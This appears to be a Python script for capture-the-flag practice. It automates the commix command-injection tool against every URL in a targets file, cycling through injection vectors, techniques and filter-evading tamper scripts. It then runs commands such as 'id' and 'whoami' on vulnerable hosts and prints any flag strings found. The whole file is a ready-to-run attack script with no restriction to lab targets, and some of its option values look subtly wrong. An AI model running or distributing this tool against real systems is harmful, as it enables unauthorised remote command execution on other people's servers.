---

## **commix_interactive.py**

```python
#!/usr/bin/env python3
import subprocess
import sys
from pathlib import Path

# ================= CONFIG =================
COMMIX_PATH = "commix.py"
FLAG_KEYWORD = "FLAG{"
DEFAULT_TARGETS_FILE = "targets.txt"
DEFAULT_SHELL_COMMANDS = ["id", "whoami"]
DEFAULT_TAMPERS = ["space2comment", "percent20", "semicolon2newline", "lowercase"]
DEFAULT_TECHNIQUES = ["classic", "blind", "time-based"]
DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0"}
COOKIES = None
TIMEOUT = 120
INJECTION_POINTS = ["GET", "POST", "COOKIE", "HEADER"]
# ==========================================

def build_cmd(target, technique=None, tamper=None, extra_cmd=None, vector="GET"):
    cmd = ["python3", COMMIX_PATH, "--batch", "-u", target]
    if technique:
        cmd.append(f"--technique={technique}")
    if tamper:
        cmd.append(f"--tamper={','.join(tamper)}")
    if extra_cmd:
        cmd.append(f"--cmd={extra_cmd}")
    if vector.upper() == "POST":
        cmd.append("--data='param=value'")
    elif vector.upper() == "COOKIE" and COOKIES:
        cmd.append(f"--cookie={COOKIES}")
    elif vector.upper() == "HEADER" and DEFAULT_HEADERS:
        headers = "; ".join(f"{k}:{v}" for k,v in DEFAULT_HEADERS.items())
        cmd.append(f"--headers={headers}")
    return cmd

def run_commix(target, vectors, techniques, tampers, shell_cmds):
    print(f"\n[+] Testing target: {target}")
    for vector in vectors:
        print(f"[INFO] Trying injection vector: {vector}")
        for tech in techniques:
            try:
                cmd = build_cmd(target, technique=tech, tamper=tampers, vector=vector)
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=TIMEOUT)

                # Instant flag detection
                for line in result.stdout.splitlines():
                    if FLAG_KEYWORD in line:
                        print(f"[FLAG FOUND] {line}")

                # Optional shell commands
                for command in shell_cmds:
                    cmd_shell = build_cmd(target, technique=tech, tamper=tampers, extra_cmd=command, vector=vector)
                    shell_result = subprocess.run(cmd_shell, capture_output=True, text=True)
                    print(f"[SHELL {vector} {command}]")
                    print(shell_result.stdout)

            except subprocess.TimeoutExpired:
                print(f"[!] Timeout expired for {target} ({tech}) via {vector}")
            except Exception as e:
                print(f"[!] Error with {target} ({vector}): {e}")

def select_from_list(prompt, options, multi=False):
    print(prompt)
    for idx, option in enumerate(options, 1):
        print(f"{idx}. {option}")
    choices = input("Select number(s) separated by comma (default all): ")
    if not choices.strip():
        return options if multi else options[0]
    indices = [int(x)-1 for x in choices.split(",")]
    selected = [options[i] for i in indices]
    return selected if multi else selected[0]

def load_targets(file_path):
    if not Path(file_path).exists():
        print(f"[!] Targets file '{file_path}' not found.")
        sys.exit(1)
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def main():
    print("=== Commix Interactive CTF Automation ===\n")
    targets_file = input(f"Targets file (default '{DEFAULT_TARGETS_FILE}'): ") or DEFAULT_TARGETS_FILE
    targets = load_targets(targets_file)

    vectors = select_from_list("Select injection vectors:", INJECTION_POINTS, multi=True)
    techniques = select_from_list("Select techniques:", DEFAULT_TECHNIQUES, multi=True)
    tampers = select_from_list("Select tamper scripts:", DEFAULT_TAMPERS, multi=True)
    shell_cmds = select_from_list("Select shell commands to run:", DEFAULT_SHELL_COMMANDS, multi=True)

    print("\n[+] Starting automated testing...\n")
    for target in targets:
        run_commix(target, vectors, techniques, tampers, shell_cmds)

if __name__ == "__main__":
    main()
